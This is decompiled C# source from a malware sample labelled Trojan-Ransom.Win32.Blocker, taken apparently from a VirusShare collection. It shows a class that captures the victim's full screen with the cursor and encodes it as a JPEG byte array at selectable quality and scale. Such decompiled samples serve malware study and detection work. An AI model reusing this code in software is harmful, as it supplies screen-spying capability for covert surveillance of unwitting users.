// Decompiled with JetBrains decompiler
// Type: n.sc
// Assembly: n, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E5EDA7BE-EB82-450E-87CA-EBEBA9467A9F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.hpqa-e14c03e0d19e65dbe36222cf50f788bc70772b23bbe20743843ead64a9d90ef7.exe

using Microsoft.VisualBasic.CompilerServices;
using n.My;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace n
{
  [StandardModule]
  internal sealed class sc
  {
    private static bool _0;
    private static int H;
    private static int W;
    private static int HH;
    private static int WW;
    public static Image Image;
    public static Rectangle Bounds;

    public static byte[] gc(ref int Q)
    {
      if (!sc._0)
      {
        sc._0 = true;
        sc.H = MyProject.Computer.Screen.Bounds.Height;
        sc.W = MyProject.Computer.Screen.Bounds.Width;
      }
      int num;
      switch (Q)
      {
        case 0:
          num = 30;
          sc.HH = 1;
          sc.WW = 1;
          break;
        case 1:
          num = 25;
          sc.HH = 1;
          sc.WW = 1;
          break;
        case 2:
          num = 20;
          sc.HH = 1;
          sc.WW = 1;
          break;
        case 3:
          num = 60;
          sc.HH = 2;
          sc.WW = 2;
          break;
        case 4:
          num = 50;
          sc.HH = 2;
          sc.WW = 2;
          break;
        case 5:
          num = 70;
          sc.HH = 3;
          sc.WW = 3;
          break;
        case 6:
          num = 40;
          sc.HH = 3;
          sc.WW = 3;
          break;
        case 7:
          num = 50;
          sc.HH = 4;
          sc.WW = 4;
          break;
        case 8:
          num = 50;
          sc.HH = 5;
          sc.WW = 5;
          break;
        case 9:
          num = 50;
          sc.HH = 6;
          sc.WW = 6;
          break;
        case 10:
          num = 50;
          sc.HH = 9;
          sc.WW = 9;
          break;
      }
      MemoryStream memoryStream = new MemoryStream();
      EncoderParameters encoderParams = new EncoderParameters(1);
      encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long) num);
      ImageCodecInfo encoderInfo = sc.GetEncoderInfo("image/jpeg");
      sc.Gd(checked ((int) Math.Round(unchecked ((double) sc.W / (double) sc.WW))), checked ((int) Math.Round(unchecked ((double) sc.H / (double) sc.HH)))).Save((Stream) memoryStream, encoderInfo, encoderParams);
      return memoryStream.ToArray();
    }

    public static ImageCodecInfo GetEncoderInfo(string M)
    {
      ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
      int length = imageEncoders.Length;
      int index = 0;
      while (index <= length)
      {
        if (Operators.CompareString(imageEncoders[index].MimeType, M, false) == 0)
          return imageEncoders[index];
        checked { ++index; }
      }
      return (ImageCodecInfo) null;
    }

    public static Image Gd(int Wi = 0, int He = 0, bool Sh = true)
    {
      Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
      Graphics graphics1 = Graphics.FromImage((Image) bitmap);
      Graphics graphics2 = graphics1;
      Size size1;
      ref Size local1 = ref size1;
      int width = Screen.PrimaryScreen.Bounds.Width;
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int height = bounds.Height;
      local1 = new Size(width, height);
      Size blockRegionSize = size1;
      graphics2.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
      if (Sh)
      {
        Cursor cursor = Cursors.Default;
        Graphics g = graphics1;
        ref Rectangle local2 = ref bounds;
        Point position = Cursor.Position;
        size1 = new Size(32, 32);
        Size size2 = size1;
        local2 = new Rectangle(position, size2);
        Rectangle targetRect = bounds;
        cursor.Draw(g, targetRect);
      }
      graphics1.Dispose();
      if (Wi == 0 & He == 0)
      {
        sc.Image = (Image) bitmap;
        return (Image) bitmap;
      }
      Image thumbnailImage = bitmap.GetThumbnailImage(Wi, He, (Image.GetThumbnailImageAbort) null, IntPtr.Zero);
      bitmap.Dispose();
      return thumbnailImage;
    }
  }
}
